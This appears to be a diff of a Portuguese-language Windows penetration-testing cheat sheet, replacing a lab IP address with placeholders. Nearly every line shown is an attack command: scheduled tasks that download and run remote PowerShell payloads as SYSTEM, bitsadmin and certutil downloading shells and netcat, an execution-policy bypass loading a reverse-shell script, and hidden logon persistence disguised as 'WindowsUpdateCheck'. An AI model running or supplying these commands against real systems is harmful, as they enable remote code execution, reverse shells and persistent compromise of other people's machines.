@@ -208,7 +208,7 @@ whoami
 ### Execução remota via Scheduled Task
 
 ```cmd
-schtasks /create /S ip /RU "SYSTEM" /TN "Updater" /TR "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10/payload.ps1')" /SC once /ST 00:00 /F
+schtasks /create /S ip /RU "SYSTEM" /TN "Updater" /TR "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://IP/payload.ps1')" /SC once /ST 00:00 /F
 ```
 
 > Comentário: execução como SYSTEM.
@@ -236,13 +236,13 @@ certutil -urlfetch -f http://ip/nc.exe C:\Windows\Temp\nc.exe
 ### bitsadmin
 
 ```cmd
-bitsadmin /transfer job /download /priority normal http://192.168.56.10/shell.bat C:\Temp\shell.bat
+bitsadmin /transfer job /download /priority normal http://ip/shell.bat C:\Temp\shell.bat
 ```
 
 ### PowerShell DownloadString
 
 ```powershell
-powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10/Invoke-PowerShellTcp.ps1')"
+powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ip/Invoke-PowerShellTcp.ps1')"
 ```
 
 ---
@@ -263,7 +263,7 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
 ### Persistência (Scheduled Task)
 
 ```cmd
-schtasks /create /tn "WindowsUpdateCheck" /tr "powershell -nop -w hidden -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.56.10/payload.ps1'))" /sc onlogon /ru SYSTEM /f
+schtasks /create /tn "WindowsUpdateCheck" /tr "powershell -nop -w hidden -c IEX ((New-Object Net.WebClient).DownloadString('http://ip/payload.ps1'))" /sc onlogon /ru SYSTEM /f
 ```
 
 ### Dump de hives (se admin)
